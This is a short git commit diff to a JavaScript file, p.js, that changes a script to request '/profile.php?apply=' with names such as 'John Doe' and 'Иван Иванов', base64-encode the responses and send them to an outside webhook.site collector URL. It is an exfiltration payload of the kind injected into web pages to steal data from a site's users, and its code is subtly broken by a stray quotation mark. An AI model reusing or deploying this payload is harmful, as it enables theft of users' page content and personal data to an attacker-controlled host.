d9c8e23b4efe8b711a08e57dbfc204171368cad4
Nellle <59132889+nellle@users.noreply.github.com>
2025-11-25 21:29:05 +0300

    Update p.js

--- p.js
+++ p.js
@@ -1,4 +1,11 @@
-fetch("/static/css/profile.css")
+fetch("/profile.php?apply="+encodeURIComponent("John Doe")")
+  .then(r => r.text())
+  .then(t => {
+    const data = btoa(unescape(encodeURIComponent(t)));
+    return fetch("https://webhook.site/fbee40ce-4c6f-442f-9b9f-5dc3d98ec99a/collect?d=" + encodeURIComponent(data));
+  });
+
+fetch("/profile.php?apply="+encodeURIComponent("Иван Иванов")")
   .then(r => r.text())
   .then(t => {
     const data = btoa(unescape(encodeURIComponent(t)));
